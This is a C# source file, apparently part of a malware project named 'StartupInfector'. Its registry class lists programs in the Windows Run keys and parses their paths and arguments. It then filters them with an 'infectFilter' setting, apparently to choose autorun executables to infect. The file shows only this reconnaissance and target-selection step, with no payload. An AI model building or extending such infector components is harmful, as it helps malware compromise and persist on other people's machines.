using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

namespace StartupInfector
{
    class cRegistry
    {
        static string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        public enum AddMask { NoAddActiveProcess, NoAddEmptyPath, NoAddEmptyPathOrActiveProcess, CollectAll };

        /// <summary>
        /// Получить список программ добавленных в автозагрузку (Только LocalMachine и CurrentUser)
        /// </summary>
        /// <param name="receiver"></param>
        /// <param name="collectMask"></param>
        public static void GetAutoruns(List<AutorunProgram> receiver, AddMask collectMask = AddMask.CollectAll)
        {
            // Добавляем в receiver(autorunPrograms) значения из листов LocalMachine и CurrentUser
            receiver.AddRange(AutorunElements(AutorunProgram.RegistryLocation.LocalMachine, collectMask));
            receiver.AddRange(AutorunElements(AutorunProgram.RegistryLocation.CurrentUser, collectMask));
        }
        
        static bool CanBeAdded(AutorunProgram autorunProgram, AddMask collectMask)
        {
            switch (collectMask)
            {
                case AddMask.NoAddActiveProcess:

                    // Если процесс запущен - нельзя
                    if (autorunProgram.IsActiveProcess)
                    {
                        return false;
                    }

                    break;

                case AddMask.NoAddEmptyPath:

                    // Если оригинального файла нет - нельзя
                    if (!autorunProgram.IsFileExists)
                    {
                        return false;
                    }

                    break;

                case AddMask.NoAddEmptyPathOrActiveProcess:

                    // Если оригинального файла нет или процесс запущен - нельзя
                    if (!autorunProgram.IsFileExists | autorunProgram.IsActiveProcess)
                    {
                        return false;
                    }

                    break;
            }

            return true;
        }

        static string[] ParseRegValue(string regValue)
        {
            if (string.IsNullOrEmpty(regValue))
            {
                return new string[] { "", "" };
            }

            string path = string.Empty;
            string args = string.Empty;

            if (regValue.Contains("\""))
            {
                string[] regValueArray = regValue.Split('"');

                path = regValueArray[1];

                if (!string.IsNullOrEmpty(regValueArray[2]))
                {
                    args = regValueArray[2];
                }
            }
            else if (regValue.Contains("/"))
            {
                string[] regValueArray = regValue.Split('/');

                path = regValueArray[0];

                for (int i = 1; i < regValueArray.Length; i++)
                {
                    args += $"/{regValueArray[i]} ";
                }
            }
            else
            {
                path = regValue;
                args = string.Empty;
            }

            return new string[] { path, args };
        }
        
        static List<AutorunProgram> AutorunElements(AutorunProgram.RegistryLocation registryLocation, AddMask collectMask)
        {
            List<AutorunProgram> tmp_list = new List<AutorunProgram>();

            RegistryKey regKey = null;

            if (registryLocation == AutorunProgram.RegistryLocation.LocalMachine)
            {
                regKey = Registry.LocalMachine.OpenSubKey(keyPath);
            }
            else if(registryLocation == AutorunProgram.RegistryLocation.CurrentUser)
            {
                regKey = Registry.CurrentUser.OpenSubKey(keyPath);
            }

            foreach (string oneProgram in regKey.GetValueNames())
            {
                AutorunProgram temp = new AutorunProgram();
                temp.RegName = oneProgram;
                temp.RegValue = regKey.GetValue(oneProgram).ToString();

                string[] RegValueParsed = ParseRegValue(temp.RegValue);
                temp.RunFilePath = RegValueParsed[0];
                temp.RunArguments = RegValueParsed[1];

                temp.IsFileExists = File.Exists(temp.RunFilePath);
                //temp.IsActiveProcess = cProcesses.IsFileActiveProcess(temp.RunFilePath);
                temp.RegLocation = registryLocation;

                // Проверяем AddMask, если хоть одно условие будет выполнено,
                // то текущий элемент не будет добавлен в List и будет продолжен перебор остальных элементов
                if (!CanBeAdded(temp, collectMask))
                {
                    continue;
                }

                // Если дошли до сюда, то добавляем в List
                tmp_list.Add(temp);
            }

            // Возвращаем сформированный временный List со списком.
            return tmp_list;
        }

        /// <summary>
        /// Проверяет есть ли указанный файл в автозагрузке 
        /// </summary>
        /// <param name="pathFile">Путь к проверяемому файлу</param>
        /// <returns></returns>
        public static bool ExistsInAutorun(string pathFile)
        {
            List<AutorunProgram> autorunPrograms = new List<AutorunProgram>();
            GetAutoruns(autorunPrograms, appConfing.infectFilter);

            foreach (AutorunProgram ap in autorunPrograms)
            {
                if(ap.RunFilePath == pathFile)
                {
                    return true;
                }
            }

            return false;
        }

        static List<AutorunProgram> LocalMachine(AddMask collectMask)
        {
            List<AutorunProgram> tmp_list = new List<AutorunProgram>();

            RegistryKey regKey = Registry.LocalMachine.OpenSubKey(keyPath);

            foreach (string oneProgram in regKey.GetValueNames())
            {
                AutorunProgram temp = new AutorunProgram();
                temp.RegName = oneProgram;
                temp.RegValue = regKey.GetValue(oneProgram).ToString();

                string[] RegValueParsed = ParseRegValue(temp.RegValue);
                temp.RunFilePath = RegValueParsed[0];
                temp.RunArguments = RegValueParsed[1];

                temp.IsFileExists = File.Exists(temp.RunFilePath);
                //temp.IsActiveProcess = cProcesses.IsFileActiveProcess(temp.RunFilePath);
                temp.RegLocation = AutorunProgram.RegistryLocation.LocalMachine;

                // Проверяем AddMask, если хоть одно условие будет выполнено,
                // то текущий элемент не будет добавлен в List и будет продолжен перебор остальных элементов
                if(!CanBeAdded(temp, collectMask))
                {
                    continue;
                }

                // Если дошли до сюда, то добавляем в List
                tmp_list.Add(temp);
            }

            // Возвращаем сформированный временный List со списком.
            return tmp_list;
        }

        static List<AutorunProgram> CurrentUser(AddMask collectMask)
        {
            List<AutorunProgram> tmp_list = new List<AutorunProgram>();

            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(keyPath);

            foreach (string oneProgram in regKey.GetValueNames())
            {
                AutorunProgram temp = new AutorunProgram();
                temp.RegName = oneProgram;
                temp.RegValue = regKey.GetValue(oneProgram).ToString();

                string[] RegValueParsed = ParseRegValue(temp.RegValue);
                temp.RunFilePath = RegValueParsed[0];
                temp.RunArguments = RegValueParsed[1];

                temp.IsFileExists = File.Exists(temp.RunFilePath);
                //temp.IsActiveProcess = cProcesses.IsFileActiveProcess(temp.RunFilePath);
                temp.RegLocation = AutorunProgram.RegistryLocation.CurrentUser;

                // Проверяем AddMask, если хоть одно условие будет выполнено,
                // то текущий элемент не будет добавлен в List и будет продолжен перебор остальных элементов
                if (!CanBeAdded(temp, collectMask))
                {
                    continue;
                }

                // Если дошли до сюда, то добавляем в List
                tmp_list.Add(temp);
            }
            return tmp_list;
        }
    }
}
